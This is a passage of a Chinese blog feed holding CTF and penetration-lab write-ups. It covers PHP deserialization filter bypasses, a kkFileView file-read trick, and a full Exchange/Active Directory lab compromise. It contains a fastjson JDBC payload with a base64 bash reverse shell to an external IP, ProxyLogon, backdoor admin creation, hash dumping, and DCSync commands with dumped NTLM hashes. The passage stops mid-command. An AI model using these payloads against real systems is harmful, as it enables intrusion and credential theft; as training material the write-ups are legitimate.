class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话其实搜索一下就能找到原题</p><p><img src="../images/image-20231017143252649.png" alt="image-20231017143252649"></p><p>这里用的是这个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd = &#x27;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#x27;;</span><br><span class="line"></span><br><span class="line">//php -r 是可以执行多行php代码</span><br></pre></td></tr></table></figure><p>其实还有很多种方法可以进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[]这个的正则匹配</span><br><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;more /[b-z][0-9][@-z][b-z]&#x27;;</span><br><span class="line"></span><br><span class="line">//当时tmd命令记错了 用了moore来做  然后没成功 就换了另一个来绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;urldecode&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;system(\$_POST[1]);&#x27;;</span><br><span class="line"></span><br><span class="line">//这里的话使用如果是$_POST[1]和system拆开来传参的话是不行的 </span><br><span class="line"></span><br><span class="line">//并且这个urldecode这个函数可以使用其他函数来进行替代</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;strtolower&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">还有一种的话是用这种方法来执行</span><br><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$this-&gt;cmd=&#x27;echo &quot;\156\154\040\057\052&quot;|sh&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="meow-blog"><a href="#meow-blog" class="headerlink" title="meow_blog"></a>meow_blog</h2><p>考察的是原型链的污染</p><p>(先留着  看不太懂)</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTg0ODg2Ng==&amp;mid=2247483844&amp;idx=1&amp;sn=c770927e26fac822403d76407979a205&amp;chksm=ce119589f9661c9f02fe03cd3c5d3aab4e3e6628496f9e16dae152b11928ce6eaac9a4b9619d&amp;mpshare=1&amp;scene=23&amp;srcid=1016aEb1onrZgJQfzK7F1YrT&amp;sharer_shareinfo=e655dbdf105d9c8a6a2fa8737dc15b93&amp;sharer_shareinfo_first=a43480738df9ebe2764fb8ef00da8d95#rd">正常污染——WP1</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247494301&amp;idx=1&amp;sn=8cb000b5f109e4a3c850901c79b41197&amp;chksm=e8a1c94cdfd6405a6a91eb8dffb86e918cc76ef73aa2560d513130a35c85bc801677fb239b73&amp;mpshare=1&amp;scene=23&amp;srcid=1017O4HFTu9JhH1721nVXxsM&amp;sharer_shareinfo=94391037d31b40e4c18fe7ca08c31089&amp;sharer_shareinfo_first=989c488368efa43fb789948100473227#rd">SSTI—-WP</a></p><h2 id="sharedBox"><a href="#sharedBox" class="headerlink" title="sharedBox"></a><strong>sharedBox</strong></h2><p>这个题还是可以探讨一下的</p><p>这个里没有环境  就讲思路就行了</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTg0ODg2Ng==&amp;mid=2247483844&amp;idx=1&amp;sn=c770927e26fac822403d76407979a205&amp;chksm=ce119589f9661c9f02fe03cd3c5d3aab4e3e6628496f9e16dae152b11928ce6eaac9a4b9619d&amp;mpshare=1&amp;scene=23&amp;srcid=1016aEb1onrZgJQfzK7F1YrT&amp;sharer_shareinfo=e655dbdf105d9c8a6a2fa8737dc15b93&amp;sharer_shareinfo_first=a43480738df9ebe2764fb8ef00da8d95#rd">WP1</a>     <a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">WP2</a></p><p>这里刚开始  我是想去信息收集一下  然后发现了是kkfileview   这个东西   然后就去找到了一篇文章</p><p><a href="https://forum.butian.net/share/2088">https://forum.butian.net/share/2088</a>  qax的一篇文章  但是由于作者对源码进行了修改  导致这里的漏洞打不通  只能是慢慢的进行摸索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://59.110.231.185:40953/fileview/;/getCorsFile?urlPath=file:///root</span><br><span class="line"></span><br><span class="line">##刚开始我这里试的时候是403  就没多想  结果赛后发现  是可以绕过的  ..........</span><br></pre></td></tr></table></figure><p>那么我们就可以开始读取文件了 <strong>(file协议是可以看目录下有啥的)</strong></p><p>然后呢我们就读取到了start.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">FLAG_PATH=/tmp/config.properties</span><br><span class="line">FLAG_MODE=M_SED</span><br><span class="line">if [ $&#123;ICQ_FLAG&#125; ];then</span><br><span class="line">    case $FLAG_MODE in</span><br><span class="line">        &quot;M_ECHO&quot;)</span><br><span class="line">            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;</span><br><span class="line">            FILE_MODE=755 # ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½flagï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½rootï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        &quot;M_SED&quot;)</span><br><span class="line">            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        &quot;M_SQL&quot;)</span><br><span class="line">            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span><br><span class="line">            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">    echo [+] ICQ_FLAG OK   </span><br><span class="line">    unset ICQ_FLAG </span><br><span class="line">else</span><br><span class="line">    echo [!] no ICQ_FLAG</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset ICQ_FLAG</span><br><span class="line">rm -rf /etc/profile.d/pouchenv.sh</span><br><span class="line">rm -rf /etc/instanceInfo</span><br><span class="line">rm -rf /start.sh</span><br><span class="line"></span><br><span class="line">/usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">/usr/sbin/crond</span><br><span class="line"></span><br><span class="line">/usr/sbin/rsyslogd</span><br><span class="line"></span><br><span class="line">javac /root/flag.java</span><br><span class="line">nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;</span><br><span class="line"></span><br><span class="line">nohup java -jar /root/upload.jar &gt;/dev/null &amp;</span><br><span class="line">sleep 1;</span><br><span class="line"></span><br><span class="line">rm /tmp/config.properties</span><br><span class="line"></span><br><span class="line">java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;</span><br><span class="line">exec tail -f /dev/null</span><br></pre></td></tr></table></figure><p>虽然单看 <code>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null</code></p><p>这里  flag是被删除了  但是呢这里并没有进行释放</p><p>和python的只open()不close()的原理是一样的 </p><p><img src="../images/image-20231017214957737.png" alt="image-20231017214957737"></p><p>那么我们就可以挨个爆破  直到得出结果</p><p>但是因为我们之前读取proc的是显示403的  这里可能过滤了这个  于是我们可以双重url编码进行绕过</p><p><code>proc/29/fd/6</code></p><p><img src="../images/image-20231017215251063.png" alt="image-20231017215251063"></p><p>当然了 这样也行</p><p><img src="../images/image-20231017215737664.png" alt="image-20231017215737664"></p><p>这都是非预期解  预期解是RCE</p><p>目前还没RCE的wp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-unserialize-pro&quot;&gt;&lt;a href=&quot;#PHP-unserialize-pro&quot; class=&quot;headerlink&quot; title=&quot;PHP_unserialize_pro&quot;&gt;&lt;/a&gt;PHP_unserialize_pro&lt;/h2&gt;&lt;figu</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Exchange</title>
    <link href="https://ke1nys.github.io/posts/47d3d323.html"/>
    <id>https://ke1nys.github.io/posts/47d3d323.html</id>
    <published>2023-10-16T12:11:34.000Z</published>
    <updated>2023-10-20T14:12:45.768Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一波</p><p><img src="../images/image-20231016201318668.png" alt="image-20231016201318668"></p><p>8000端口有一个<code>Lumia ERP</code></p><p>这里的话是存在一个弱口令的 <code>admin/123456</code>   用别的方法其实也行  存在一个信息泄露</p><p><img src="../images/image-20231016201518335.png" alt="image-20231016201518335"></p><p><img src="../images/image-20231016201537456.png" alt="image-20231016201537456"></p><p>于是登录后台  发现题目给了个<code>JDBC</code>的提示</p><p>于是查了一下  发现是fastjson的JDBC    <a href="https://www.cnblogs.com/kingbridge/articles/16720318.html">JDBC-fastjson</a></p><p>然后跟着来打就行了</p><p>先下载一个Mysql-Fake   <a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a>   然后将<code>yso.jar</code>下载到这个MySQL文件夹里  并且修改config文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;config&quot;:&#123;</span><br><span class="line">            &quot;ysoserialPath&quot;:&quot;ysoserial-all.jar&quot;,</span><br><span class="line">            &quot;javaBinPath&quot;:&quot;java&quot;,</span><br><span class="line">            &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,</span><br><span class="line">            &quot;displayFileContentOnScreen&quot;:true,</span><br><span class="line">            &quot;saveToFile&quot;:true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fileread&quot;:&#123;</span><br><span class="line">            &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,</span><br><span class="line">            &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,</span><br><span class="line">            &quot;win&quot;:&quot;c:\\windows\\&quot;,</span><br><span class="line">            &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">            &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,</span><br><span class="line">            &quot;index_php&quot;:&quot;index.php&quot;,</span><br><span class="line">            &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,</span><br><span class="line">            &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;yso&quot;:&#123;</span><br><span class="line">            &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],</span><br><span class="line">            &quot;CommonsCollections6&quot;:[&quot;CommonsCollections6&quot;,&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行<code>server.py</code>文件</p><p><img src="../images/image-20231016202349848.png" alt="image-20231016202349848"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;101.42.39.110&quot;, &quot;portToConnectTo&quot;: 3306, &quot;info&quot;: &#123; &quot;user&quot;: &quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;, &quot;password&quot;: &quot;pass&quot;, &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot; &#125; &#125;</span><br></pre></td></tr></table></figure><p>传的时候记得url编码</p><p><img src="../images/image-20231016202441457.png" alt="image-20231016202441457"></p><p>这个shell一来就是root权限  好家伙</p><p>直接找flag就行了</p><p>这里的话我习惯在弹一个shell到msf上</p><p><img src="../images/image-20231016202922827.png" alt="image-20231016202922827"></p><p>然后上传工具扫内网了</p><p><img src="../images/image-20231016203003334.png" alt="image-20231016203003334"></p><p><img src="../images/image-20231016203232455.png" alt="image-20231016203232455"></p><p>总结一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.3.12   getshell主机</span><br><span class="line"> </span><br><span class="line">172.22.3.2   win16 DC域控</span><br><span class="line"></span><br><span class="line">172.22.3.9  EXC01  ---exchange01  outlook  windows</span><br><span class="line"></span><br><span class="line">172.22.3.26  域内主机 XIAORANG\XIAORANG-PC</span><br></pre></td></tr></table></figure><p>然后搭建代理隧道</p><p>先去访问这个exchange</p><p><img src="../images/image-20231016203618197.png" alt="image-20231016203618197"></p><p>这里发现是exchange server 2016 然后直接就去用ProxyLogon来打    <a href="https://github.com/hausec/ProxyLogon">https://github.com/hausec/ProxyLogon</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016204117998.png" alt="image-20231016204117998"></p><p>给的是system权限  </p><p><img src="../images/image-20231016204239171.png" alt="image-20231016204239171"></p><p>发现3389端口还开着  新创建一个本地管理员账户进行rdp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016204708760.png" alt="image-20231016204708760"></p><p>直接去拿flag就行了  </p><p>因为我们现在是本地管理员账户 不是域内账户  为了hashdump  得弹个shell</p><p>因为我们之前获取到了system的shell 直接传个马上去  然后shell执行  以system权限反弹</p><p><img src="../images/image-20231016205412245.png" alt="image-20231016205412245"></p><p><img src="../images/image-20231016205422234.png" alt="image-20231016205422234"></p><p><img src="../images/image-20231016205457506.png" alt="image-20231016205457506"></p><p>直接拿下exchange这台机器</p><p>然后开始查看域内hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9dca627bdcde6df114a3c4a18a09765d:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Ke1nys:1000:aad3b435b51404eeaad3b435b51404ee:6912928308e3cda903e6d75bd6091a20:::</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username              Domain          NTLM                              SHA1                                      DPAPI</span><br><span class="line">--------              ------          ----                              ----                                      -----</span><br><span class="line">HealthMailbox0d5918e  XIAORANG        455badfb0e1e1d3ecad7d3f49199bbf4  359551c1705616dabc7d48d1163c8ea07701d8b1  312f49d92f1db5ad776f4d2d57c6ccff</span><br><span class="line">HealthMailbox0d5918e  XIAORANG        8946a14d33bf2fa6542c2d9980c3af21  153ca12269ffae16f0475fb8b4532a647c05c11a  f58fb0f7fc11355abf57fe3b7a581bd7</span><br><span class="line">Ke1nys                XIAORANG-EXC01  6912928308e3cda903e6d75bd6091a20  4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">XIAORANG-EXC01$       XIAORANG        172701e17477920ff7097626eaeb0ea7  c473f34cecfc9d6b0481d79ee031c8c4dfc27a20</span><br><span class="line">XIAORANG-EXC01$       XIAORANG        9587463cfa3fd1ea760c401e2c52e224  162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">Zhangtong             XIAORANG        22c7f81993e96ac83ac2f3f1903de8b4  4d205f752e28b0a13e7a2da2a956d46cb9d9e01e  ed14c3c4ef895b1d11b04fb4e56bb83b</span><br></pre></td></tr></table></figure><p>这里的话直接使用Viper的msf直接进入shell  然后直接执行<code>sharphound.exe</code>就行了</p><p><img src="../images/image-20231016211207064.png" alt="image-20231016211207064"></p><p><img src="../images/image-20231016210754387.png" alt="image-20231016210754387" style="zoom:50%;" /></p><p><img src="../images/image-20231016211040130.png" alt="image-20231016211040130"></p><p>拖到域内分析就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u xiaorang-exc01 --hashes &quot;aad3b435b51404eeaad3b435b51404ee:9dca627bdcde6df114a3c4a18a09765d&quot; -d xiaorang.lab -dc xiaorang-win16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><p>这个命令的话  好像得是获取到机器的hash值才行   mimikatz 的sekurlsa::logonpasswords 可以导出机器的hash</p><p><strong>(注册表也可以)</strong></p><p><img src="../images/image-20231016211513614.png" alt="image-20231016211513614"></p><p>发现这个机器账户具有writeDacl的功能  并且是对admins这个组的  这个组还具有域管的权限  说明我们可以写域管权限的acl了  </p><blockquote><p>ACL就是访问控制  可以指派xxx具有xxx权限</p></blockquote><p>这里的话我们就直接给ZHANGTONG这个用户DCSync权限  </p><p>有两种方法 </p><ul><li>第一种是使用impacket里的dacledit.py</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :4de6c4eeee1f315e1241c4a813e2b3b5 -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>但是这里我使用的话报错 </p><p>所以我选择第二种方法</p><ul><li>第二种是选择</li></ul><p><strong>bloodAD</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodyAD -d xiaorang.lab -u &#x27;XIAORANG-EXC01$&#x27; -p :172701e17477920ff7097626eaeb0ea7 --host 172.22.3.2 add dcsync Zhangtong</span><br></pre></td></tr></table></figure><p>这里的这个hash值是机器的hash值  因为根据sharphound的分析  发现是这个这个机器账户才有这个权限</p><p><img src="../images/image-20231016213037029.png" alt="image-20231016213037029"></p><p>然后使用脚本直接执行DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure><p>这里使用的是Zhangtong用户的hash值    这个脚本在impacket里就有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:8faefce446279aec0f176a8315b3fec7:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:8946a14d33bf2fa6542c2d9980c3af21:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:56b000c4417c31ada3ba7d3a655d6862:::</span><br><span class="line">XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:172701e17477920ff7097626eaeb0ea7:::</span><br><span class="line">XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:81d92fdc7be4bcb8cdf9155bc40a8a31:::</span><br></pre></td></tr></table></figure><p>域控hash拿到  直接psexec连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb 